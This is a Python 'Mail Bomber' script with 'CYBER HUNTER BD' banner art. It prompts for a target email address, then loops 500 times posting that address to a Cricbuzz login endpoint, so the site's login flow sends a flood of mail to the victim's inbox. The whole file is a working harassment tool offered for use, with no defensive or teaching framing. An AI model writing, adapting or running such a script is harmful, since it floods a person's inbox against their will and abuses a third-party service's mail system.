import requests



from requests.structures import CaseInsensitiveDict


import os
import time
import sys
import random
import requests
from threading import Thread as pool

import os,requests
blue= '\33[94m'
lightblue = '\033[94m'
red = '\033[91m'
white = '\33[97m'
yellow = '\33[93m'
green = '\033[1;32m'
cyan  = "\033[96m"
end = '\033[0m'
black="\033[0;30m"
pink="\x1b[95m"
blue="\x1b[94m"
underline='\x1b[4m'
colouroff="\x1b[00m"

os.system('clear')
r=requests.get('https://pastebin.com/raw/Ga6ej4mA').text
logu=(pink+f"""
\t  ____      _   _      ____
\t / ___|    | | | |    | __ )
\t| |        | |_| |    |  _ \    """+colouroff+underline+"""CYBER HUNTER BD"""+colouroff+pink+"""
\t| |___     |  _  |    | |_) |
\t \____|    |_| |_|    |____/ 
\n"""+blue+"""           Focous on Your Aim, You Will winner""")


line=end+"\n__________________________________________________________"
def a():
	print(logu+"\n\n	"+green+"   Developed By : MD ALAMIN CHOWDORY"+green+"\n\n 	"+red+"   Version :"+r+"\n\n           Mail Bomber "+line)

a()

email=str(input(yellow+"\nEnter Your Email: "))
url = "https://m.cricbuzz.com/cbplus/auth/user/login"

headers = CaseInsensitiveDict()
headers["Content-Type"] = "application/json"

data = '{"username":"'+email+'","provider":"Email"}'
os.system("clear")
a()
print(green+"\n\nCHB TOOL START WAIT...... \n\n")
for j in range(500):
	resp = requests.post(url, headers=headers, data=data)
	
	if resp.status_code==200:
		print(green+"\n\t\tCBB✔✔"+str(j+1)+"⇨⇨ Mail Sent ")
	else:
		print("Mail Sent felid  ")


